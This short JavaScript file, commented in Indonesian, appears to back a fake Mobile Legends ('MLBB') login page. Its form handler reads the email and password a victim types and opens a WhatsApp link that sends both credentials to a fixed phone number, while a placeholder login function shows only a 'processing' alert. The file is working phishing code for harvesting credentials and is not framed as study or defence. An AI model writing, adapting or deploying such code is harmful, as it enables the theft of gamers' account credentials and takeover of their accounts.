// Login redirect simulasi
function login(method) {
  alert("Login via " + method + " diproses...");
}

// Kirim login email & password ke nomor WA
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;
  let nomor = "6285709518077";
  let pesan = `Login MLBB:\nEmail: ${email}\nPassword: ${password}`;
  window.open(`https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`, "_blank");
});